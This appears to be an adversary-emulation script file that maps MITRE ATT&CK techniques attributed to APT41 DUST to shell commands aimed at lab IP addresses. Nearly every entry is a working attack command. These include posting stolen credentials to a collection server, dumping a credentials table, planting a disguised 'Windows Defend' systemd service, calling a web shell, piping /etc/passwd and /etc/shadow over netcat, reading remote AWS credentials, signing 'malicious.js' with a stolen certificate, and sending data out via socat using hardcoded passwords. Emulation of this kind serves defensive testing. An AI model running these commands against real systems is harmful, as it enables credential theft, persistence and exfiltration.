name: T1102 - Web Service
description: APT41 DUST used compromised Google Workspace accounts for command and control.

executors.name: sh
executors.command: rm -rf /root/.ssh/known_hosts && curl -X POST -H "Content-Type: application/json" -d '{"key":"session1","val":"stolen_credentials_or_commands"}' http://172.21.0.20:8080/store && curl http://172.21.0.20:8080/fetch/session1

name: T1213.006 - Databases
description: APT41 DUST collected data from victim Oracle databases using SQLULDR2.

executors.name: sh
executors.command: mysql -h 172.21.0.20 -u attacker -pAttack3rPass -e "SELECT * FROM sensitive_data.credentials;"

name: T1543.003 - Windows Service
description: APT41 DUST used Windows Services with names such as `Windows Defend` for persistence of DUSTPAN.

executors.name: sh
executors.command:
printf "[Unit]
Description=Windows Defend Service
[Service]
ExecStart=/srv/samba/share/WindowsDefend.sh
Restart=always
[Install]
WantedBy=multi-user.target
" > WindowsDefend.service && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'put /bin/bash WindowsDefend.sh' && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'put WindowsDefend.service' && sshpass -p 'DebianUser' ssh -o StrictHostKeyChecking=no DebianUser@172.21.0.20 'nohup /srv/samba/share/WindowsDefend.sh &'

name: T1070.004 - File Deletion
description: APT41 DUST deleted various artifacts from victim systems following use.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no  attacker@172.21.0.20 'echo maliciousfile > /tmp/malware.txt && rm -f /tmp/malware.txt'

name: T1105 - Ingress Tool Transfer
description: APT41 DUST involved execution of `certutil.exe` via web shell to download the DUSTPAN dropper.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no root@172.22.0.20:/tmp/toolfile /tmp/toolfile' &&  sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@172.21.0.20:/tmp/toolfile /tmp/toolfile

name: T1505.003 - Web Shell
description: APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.

executors.name: sh
executors.command: curl "http://172.21.0.20/shell.php?cmd=id"

name: T1593.002 - Search Engines
description: APT41 DUST involved use of search engines to research victim servers.

executors.name: sh
executors.command: curl http://172.21.0.20/server-status.php

name: T1588.003 - Code Signing Certificates
description: APT41 DUST used stolen code signing certificates to sign DUSTTRAP malware and components.

executors.name: sh
executors.command: wget http://172.21.0.20/root/certs/code_signing.pfx -O code_signing.pfx && openssl pkcs12 -in code_signing.pfx -nocerts -nodes -passin pass:password123 -out code_signing.key && openssl pkcs12 -in code_signing.pfx -clcerts -nokeys -passin pass:password123 -out code_signing.crt && echo 'console.log("Malicious signed code executed");' > malicious.js && openssl dgst -sha256 -sign code_signing.key -out malicious.js.sig malicious.js && cat malicious.js

name: T1586.003 - Cloud Accounts
description: APT41 DUST used compromised Google Workspace accounts for command and control.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 "cat ~/.aws/credentials" && echo "aws s3 ls not available on lab!"

name: T1119 - Automated Collection
description: APT41 DUST used tools such as SQLULDR2 and PINEGROVE to gather local system and database information.

executors.name: sh
executors.command: curl http://172.21.0.20/crm.php -s --fail --retry 3

name: T1027.013 - Encrypted/Encoded File
description: APT41 DUST used encrypted payloads decrypted and executed in memory.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 "echo HELLO_LAB | python3 /home/attacker/reverse.py"

name: T1074.001 - Local Data Staging
description: APT41 DUST involved exporting data from Oracle databases to local CSV files prior to exfiltration.

executors.name: sh
executors.command: echo "cat /etc/passwd | tee -a /tmp/staged_data.csv" | nc -w 2 172.21.0.20 4444 && echo "cat /etc/shadow | tee -a /tmp/staged_data.csv" | nc -w 2 172.21.0.20 4444 && echo "cat /tmp/staged_data.csv" | nc -w 2 172.21.0.20 4444 | tee -a /tmp/staged_data.csv

name: T1567.002 - Exfiltration to Cloud Storage
description: APT41 DUST exfiltrated collected information to OneDrive.

executors.name: sh
executors.command: echo "For security reasons no user/password of Cloud Storage will be shown here! This is a console script to upload files..."

name: T1036.004 - Masquerade Task or Service
description: APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.

executors.name: sh
executors.command: sshpass -p 'BackupPass123' ssh -o StrictHostKeyChecking=no backupsvc@172.21.0.20 "nohup /usr/local/bin/systemd-update </dev/null >/dev/null 2>&1 &"

name: T1596.005 - Scan Databases
description: APT41 DUST used internet scan data for target development.

name: T1574.001 - DLL
description: APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP. APT41 DUST used also DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller.

executors.name: sh

name: T1569.002 - Service Execution
description: APT41 DUST used Windows services to execute DUSTPAN.

executors.name: sh
executors.command: curl -X POST -d "cmd=touch /tmp/owned_by_attack" http://172.21.0.20:8081/exec

name: T1560.001 - Archive via Utility
description: APT41 DUST used `rar` to compress data downloaded from internal Oracle databases prior to exfiltration.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'rar a /tmp/collected_data.rar /var/log/*.log' && sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'sshpass -p 'Passw0rd' scp -o StrictHostKeyChecking=no /tmp/collected_data.rar attacker@172.22.0.20:/tmp/'

name: T1071.001 - Web Protocols
description: APT41 DUST used HTTPS for command and control.

executors.name: sh
executors.command: curl -k -X POST https://172.21.0.20:443/cmd -H "Content-Type: application/json" -d '{"command":"id"}'

name: T1594 - Search Victim-Owned Websites
description: APT41 DUST involved access of external victim websites for target development.

executors.name: sh
executors.command: curl http://172.21.0.20/robots.txt && curl http://172.21.0.20/secret/index.html

name: T1583.007 - Serverless
description: APT41 DUST used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control.

executors.name: sh
executors.command: curl -X POST --data 'id' http://172.21.0.20:8082  && curl -X POST --data 'ifconfig' http://172.21.0.20:8082

name: T1573.002 - Asymmetric Cryptography
description: APT41 DUST used HTTPS for command and control.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "ls -la" | openssl pkeyutl -encrypt -pubin -inkey /root/public_key.pem -out /root/encrypted_command.bin && /root/decrypt_and_execute.sh && cat /root/decrypted_command.txt'

name: T1553.002 - Code Signing
description: APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 "echo 'echo Malicious_signed_payload_executed' | openssl pkeyutl -sign -inkey /root/code_signing_key.pem | socat - TCP:172.21.0.20:4445 && echo Payload_sent"

name: END OF APT 41 DUST
description: This is the end.

executors.name: sh
executors.command: echo "END OF APT 41 DUST"
